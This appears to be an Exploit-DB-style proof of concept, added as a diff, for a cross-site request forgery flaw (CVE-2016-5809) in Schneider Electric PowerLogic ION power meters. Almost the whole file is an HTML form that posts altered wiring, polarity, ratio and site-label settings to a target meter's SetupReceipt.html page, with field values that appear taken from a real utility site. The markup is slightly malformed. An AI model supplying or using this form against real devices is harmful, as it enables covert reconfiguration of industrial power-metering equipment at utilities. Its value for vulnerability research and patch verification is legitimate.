@@ -1,0 +1,62 @@
+# Exploit Title: Powerlogic Schneider Electric IONXXXX Series - Cross-Site Request Forgery
+# Date: 2018-05-17
+# Exploit Author: t4rkd3vilz
+# Vendor Homepage: http://www.schneider-electric.com/
+# Version: ION73XX series, ION75XX series, ION76XX series, ION8650 series, ION8800 series, PM5XXX series.
+# Tested on: All Version
+# CVE : CVE-2016-5809
+
+# PoC
+
+
+<form name="frmConfig" action="http://TargetIp/SetupReceipt.html
+<http://targetip/SetupReceipt.html>" method="post">
+select name="PMLSel_0x7800">
+<option selected="selected">9S - 4 Wire Wye/Delta</option>
+<option>35S - 3 Wire</option>
+<option>36S - 4 Wire Wye</option>
+<option>DEMO</option>
+</select>
+<select name="PMLSel_0x7a4a">
+<option selected="selected">Normal</option>
+<option>Inverted</option>
+</select>
+<input type="text" name="PMLIFl_0x7000" size="15" value="480.00"/>
+<select name="PMLSel_0x7a4b">
+<option selected="selected">Normal</option>
+<option>Inverted</option>
+</select>
+<input type="text" name="PMLIFl_0x7001" size="15" value="480.00"/>
+<select name="PMLSel_0x7a4c">
+<option selected="selected">Normal</option>
+<option>Inverted</option>
+</select>
+<input type="text" name="PMLIFl_0x7002" size="15" value="200.00"/>
+<input type="text" name="PMLIFl_0x7003" size="15" value="5.00"/>
+<select name="PMLSel_0x7801">
+<option selected="selected">Normal</option>
+<option>Inverted</option>
+</select>
+<select name="PMLSel_0x7802">
+<option selected="selected">Normal</option>
+<option>Inverted</option>
+</select>
+<select name="PMLSel_0x7803">
+<option selected="selected">Normal</option>
+<option>Inverted</option>
+</select>
+<input type="text" name="PMLIFl_0x7004" size="15" value="5.00"/>
+<select name="PMLSel_0x7a49">
+<option selected="selected">Normal</option>
+<option>Inverted</option>
+</select>
+<input type="text" name="PMLIFl_0x7005" size="15" value="5.00"/>
+<input type="text" name="PMLIFl_0x721a" size="15" value="0.00"/>
+<input type="text" name="PMLIStr_0x1345" size="15" value="EPMAPS"/>
+<input type="text" name="PMLIFl_0x70b4" size="15" value="900.00"/>
+<input type="text" name="PMLIStr_0x1346" size="15" value="POZO SAN"/>
+<input type="text" name="PMLIFl_0x70c4" size="15" value="1.00"/>
+<input type="text" name="PMLIStr_0x1347" size="15" value="ANTONIO PICHIN."/>
+<input type="text" name="PMLIFl_0x70d4" size="15" value="70.00"/>
+<input type="submit" class="btn" value="Save" name="Submit22" />
+</form>
